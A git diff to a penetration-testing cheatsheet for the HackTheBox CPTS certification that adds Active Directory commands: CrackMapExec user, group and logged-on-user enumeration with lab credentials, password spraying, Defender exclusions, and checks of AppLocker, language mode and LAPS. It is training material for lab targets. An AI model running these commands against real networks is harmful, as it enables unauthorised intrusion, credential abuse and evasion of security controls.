@@ -58,7 +58,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
     - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
-    - [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
+    - [Enumerating Disabling/Bypassing Security Controls](#enumerating-and-bypassing-security-controls)
     - [Living Of The Land](#living-of-the-land)
     - [Kerberoasting](#kerberoasting)
     - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
@@ -1094,7 +1094,7 @@ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 # Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
 crackmapexec smb 172.16.5.5 --users
 OR
-# crackmapexec to check the valid credintails
+# crackmapexec to check the valid credintails for  Domain User Enumeration
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
@@ -1119,8 +1119,11 @@ sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
-##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
+##### [Enumerating Disabling/Bypassing Security Controls](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
+# Checking the Status of Defender with Get-MpComputerStatus
+Get-MpComputerStatus
+
 # Check if Defender is enabled
 Get-MpComputerStatus
 Get-MpComputerStatus | Select AntivirusEnabled
@@ -1169,6 +1172,29 @@ Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Checking PowerShell Constrained Language Mode
+$ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+
+# Checking LAPs
+Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
+
+----------------------------------------------------------------------------------------------
+# Credentialed Enumeration - from Linux
+
+## crackmapexec - Domain User Enumeration
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+
+## crackmapexec - Domain Group Enumeration
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+## crackmapexec - CME - Logged On Users
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+
 ```
 ##### Living Of The Land
 ```
